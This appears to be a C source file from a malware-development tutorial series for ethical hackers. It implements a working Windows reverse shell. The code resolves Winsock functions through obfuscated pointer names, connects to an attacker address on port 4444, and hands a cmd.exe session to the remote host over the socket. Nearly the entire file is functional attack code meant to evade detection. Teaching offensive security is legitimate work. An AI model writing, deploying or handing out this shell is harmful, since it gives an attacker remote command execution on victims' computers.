/*
 * Malware Development for Ethical Hackers
 * hack.c - combining jz jnz (without inline assembly)
 * author @cocomelonc
*/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

// define obfuscated function pointer types for Winsock functions
typedef int (WSAAPI *WSAStartup_t)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *WSASocket_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef int (WSAAPI *WSAConnect_t)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(int argc, char* argv[]) {
  
  // ip and port details for the attacker's machine
  char *attackerIP = "10.10.1.5";
  short attackerPort = 4444;

  HMODULE hWS2_32 = LoadLibrary("ws2_32.dll");

  // Resolve function addresses dynamically
  WSAStartup_t Cat = (WSAStartup_t)GetProcAddress(hWS2_32, "WSAStartup");
  WSASocket_t Dog = (WSASocket_t)GetProcAddress(hWS2_32, "WSASocketA");
  WSAConnect_t Mouse = (WSAConnect_t)GetProcAddress(hWS2_32, "WSAConnect");

  // initialize socket library
  Cat(MAKEWORD(2, 2), &socketData);

  // create socket object
  mainSocket = Dog(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  connectionAddress.sin_family = AF_INET;
  connectionAddress.sin_port = htons(attackerPort);
  connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

  // establish connection to the remote host
  Mouse(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

  memset(&startupInfo, 0, sizeof(startupInfo));
  startupInfo.cb = sizeof(startupInfo);
  startupInfo.dwFlags = STARTF_USESTDHANDLES;
  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

  // initiate cmd.exe with redirected streams
  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
  exit(0);
}
